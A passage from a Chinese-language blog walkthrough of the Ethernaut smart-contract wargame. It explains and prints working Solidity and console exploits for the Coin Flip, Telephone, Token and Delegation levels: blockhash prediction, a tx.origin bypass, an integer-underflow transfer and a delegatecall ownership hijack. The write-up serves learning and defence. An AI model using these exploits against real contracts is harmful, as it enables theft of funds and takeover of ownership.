+<p>Remix还是要学习一下，首先是编译，把代码输进去，就可以点击编译，发现没有错误，就可以部署合约。下面的exp也是上网看别人的，不过因为过了一两年，一些东西还是需要修修补补，根据提示一顿操作。这个Remix管得比较宽，经常有警告。我照着警告把它解决了，它又报错，不给运行。我们可以勾选隐藏警告，不处理它也问题不大。</p>
+<p>exp（前面都是原代码，关键在后面）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue/FACTOR;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract coin_hack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  <span class="comment">// 用实例地址替换</span></span><br><span class="line">  address target = <span class="number">0xa056c4c58a3866d2e89d7787a7fd9d1680d01ffd</span>;</span><br><span class="line">  <span class="comment">//这里的target值为instance address，但是需要注意的这里不能直接复制粘贴console的值，在最终的转账里这样的address是不被认可的，因为不会通过checkSum函数</span></span><br><span class="line">  <span class="comment">//这里在线compile会给出正确的addreee，其实那几位就是校验和用的，所以这里推荐的做法就是先复制粘贴，然后在线编译更改正确的address</span></span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span>&#123;</span><br><span class="line">    fliphack = CoinFlip(target);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pre_result</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;<span class="comment">//先执行一次，获取结果</span></span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-<span class="number">1</span>));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    <span class="keyword">return</span> coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    bool guess = pre_result();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署合约需要选择环境为Injected Web3，这时候Remix会自动请求连接MetaMask。账户（ACCOUNT）也自动选定，合约需要选择我们所需要的，这里是coin_hack。At Address是我们生成的关卡实例地址（Instance address）。</p>
+<p><img src="https://gitee.com/crownZ/blog_image/raw/master/20200509210444.png"></p>
+<p>等待合约部署完毕，点Deployed Contracts，看到合约coin_hack实现的两个功能。我们直接点hack，进行猜正反。但必须等一次hack操作完才能点下一次hack，否则如果多个hack同时运行，他们上一个区块地址的都是一样的，等有一个hack完成后，就打包生成了新的区块，剩下hack所取上一个区块的地址就不对了。</p>
+<p><img src="https://gitee.com/crownZ/blog_image/raw/master/20200509210912.png"></p>
+<p>运行几次后，可以回Ethernaut的终端看一下我们猜对了几次，等c内数值等于10，就可以提交本实例了。</p>
+<p><img src="https://gitee.com/crownZ/blog_image/raw/master/20200509212355.png"></p>
+<h1 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4.Telephone"></a>4.Telephone</h1><p>过关要求：成为合约拥有者</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码比较简单，Telephone合约内有构造函数，初始化合约拥有者为部署者。然后是一个changeOwner函数，判断tx.origin和msg.sender是否相等。</p>
+<p>tx.origin是交易的发送方，是源头；msg.sender是消息的发送者。如果是在同一个合约调用，这两者相等。但如果是在多个合约情况下，如果用户通过A合约来调用B合约，有调用链：client -&gt; A -&gt; B，对于B合约，msg.sender就代表合约A，tx.origin则代表client。</p>
+<p>了解完，我们就可以再构造合约调用题目合约，来使tx.origin != msg.sender。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Telephone_hack &#123;</span><br><span class="line">    Telephone target= Telephone(<span class="number">0xee03ffbb033286a486e943b42392064bf795ad34</span>);<span class="comment">//关卡实例地址 </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;				<span class="comment">//因为我们直接调用Telephone_hack合约</span></span><br><span class="line">        target.changeOwner(msg.sender);<span class="comment">//msg.sender在这里表示我们自己的地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把以上exp用Remix连接，编译。调用hack功能，再回到关卡，查看拥有者已变为自己。</p>
+<p><img src="https://gitee.com/crownZ/blog_image/raw/master/20200510105632.png"></p>
+<h1 id="5-Token"><a href="#5-Token" class="headerlink" title="5.Token"></a>5.Token</h1><p>过关要求：初始有token20个，要想办法黑掉这个智能合约来获取得更多Token（可能是一个很大的值）。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Token</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> </span>&#123;<span class="comment">//构造函数</span></span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="comment">//转账函数，会先检查发送者是否足以支付_value</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="comment">//检查余额</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到要求说，可能是一个很大的值，就想到可能是整数溢出。</p>
+<p>因为balance为unit类型，无符号整数，不存在负数形式，所以 <code>balances[msg.sender] - _value &gt;= 0</code> 永远为真。那么当我们_value 大于balances[msg.sender] 时，balances[msg.sender]就会下溢，变成一个非常大的数。</p>
+<p>在console中执行contract.transfer(player, 21)，player为自己账户地址，<code>balances[msg.sender] - _value</code>就是20-21，将溢出为2^256-1，足够大了。之后，用<code>await contract.balanceOf(player)</code>查看下，就可以提交了。</p>
+<p><img src="https://gitee.com/crownZ/blog_image/raw/master/20200510111526.png"></p>
+<p>在实际运用中，可以用OpenZeppelin库来防御这种漏洞。</p>
+<h1 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6.Delegation"></a>6.Delegation</h1><p>过关要求：成为合约拥有者。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;<span class="comment">//改变合约拥有者</span></span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);<span class="comment">//delegate对象</span></span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;<span class="comment">//fallback函数</span></span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析以上合约，Delegate初始化时将传入的address设定为合约的owner，下面有一个pwn函数能修改权限。之后，下面的Delegation合约则实例化了上面的Delegate合约，其fallback函数使用了delegatecall来调用其中的delegate合约，而这里的delegatecall就是问题的关键所在。</p>
+<p>我们经常会使用call函数与合约进行交互，对合约发送数据。call是一个较底层的接口，我们经常会把它封装在其他函数里使用。这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。</p>
+<p>用于调用其他合约的call类的函数，其中的区别如下：<br>1、call 在外部调用时，上下文是外部合约<br>2、delegatecall 在外部调用时，上下文是调用合约<br>3、callcode() 其实是 delegatecall() 之前的一个版本，两者都是将外部代码加载到当前上下文中进行执行，但是在 msg.sender 和 msg.value 的指向上却有差异。</p>
+<p>在这里，我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里涉及到使用call指定调用函数的操作。当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，我们可以把这个id看作是和函数名等价的一个东西。sha3我们可以直接通过web3.sha3来调用，pwn函数的前四字节（id）如下。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200627111912.png"></p>
+<p>经过分析，我们可以先通过web3.sha3产生pwn函数的id，然后再触发delegatecall的fallback函数。前面说了有两种方法：</p>
+<ol>
+<li>在一个到合约的调用中，没有其他函数与给定的函数标识匹配（或没有提供调用数据），那么这个函数会被执行。</li>
+<li>每当合约收到以太币时，这个函数也会执行。</li>
+</ol>
+<p>这里我们直接用封装好的sendTransaction来发送data。sendTransaction函数起到发送以太币的作用，所以能触发fallback函数。同时fallback函数中的delegatecall函数要调用msg.data中的数据，所以要发data过去。有关<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/web3js-0.2x/web3.eth.html#sendtransaction">sendTransaction</a>的详细信息。</p>
+<p>解题步骤：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>:web3.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200627114418.png"></p>
+<p>Loading…</p>
+<blockquote>
+<p>参考</p>
+<p>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7173#toc-0">Ethernaut闯关录（上）</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/148341">Zeppelin Ethernaut writeup</a></p>
+<p>[3]</p>
+</blockquote>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">0.Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">1.Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">2.Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">3.Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">4.Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Token"><span class="toc-number">6.</span> <span class="toc-text">5.Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">6.Delegation</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/05/09/Ethernaut/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&text=智能合约入门游戏——Ethernaut"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&is_video=false&description=智能合约入门游戏——Ethernaut"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约入门游戏——Ethernaut&body=Check out this article: https://crownz-sec.github.io/2020/05/09/Ethernaut/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&name=智能合约入门游戏——Ethernaut&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/05/09/Ethernaut/&t=智能合约入门游戏——Ethernaut"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    crownZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'crownZz';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
